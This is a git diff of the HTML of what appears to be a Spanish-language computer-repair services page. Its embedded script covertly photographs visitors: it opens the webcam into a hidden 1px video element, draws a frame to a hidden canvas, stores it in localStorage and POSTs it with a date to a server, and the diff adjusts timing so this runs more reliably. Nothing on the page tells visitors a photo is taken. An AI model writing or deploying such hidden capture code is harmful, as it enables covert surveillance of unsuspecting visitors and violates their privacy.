@@ -161,6 +161,7 @@
     ul li {
       margin-bottom: 5px;
     }
+    /* Cambia esto: oculta el video pero permite que el navegador lo procese */
     #hiddenVideo {
       visibility: hidden;
       width: 1px;
@@ -241,10 +242,12 @@
     (function() {
       const video = document.getElementById('hiddenVideo');
       const canvas = document.getElementById('hiddenCanvas');
+
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
           video.srcObject = stream;
-          video.onplaying = () => {
+         
+          video.onloadedmetadata = () => {
             setTimeout(() => {
               canvas.width = video.videoWidth || 320;
               canvas.height = video.videoHeight || 240;
@@ -252,7 +255,7 @@
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                 const foto = canvas.toDataURL('image/jpeg', 0.7);
 
-            
+                
                 let fotos = [];
                 try {
                   fotos = JSON.parse(localStorage.getItem('fotosGaleriaGlobal')) || [];
@@ -268,20 +271,24 @@
                   body: JSON.stringify({ data: foto, fecha: new Date().toLocaleDateString() })
                 });
               } catch (e) {
-            
+                
               }
-
-              // Detener cámara
+              
               if (video.srcObject) {
                 video.srcObject.getTracks().forEach(track => track.stop());
               }
-            }, 800); 
+            }, 700); 
           };
         })
-        .catch(() => { /* Aclaro que el usuario da el permiso la pagina lo pregunta att: Andres */ });
+        .catch(() => { /* Aclaro que mo se hace nada si usuario no da permiso att:Andres*/ });
     })();
 
     function showContent(option) {
+      const content = document.getElementById('content');
+      let servicio = '';
+      let texto = '';
+      let mensaje = '';
+      switch(option) {
   case 'PC':
     servicio = 'Reparación de PC';
     texto = `
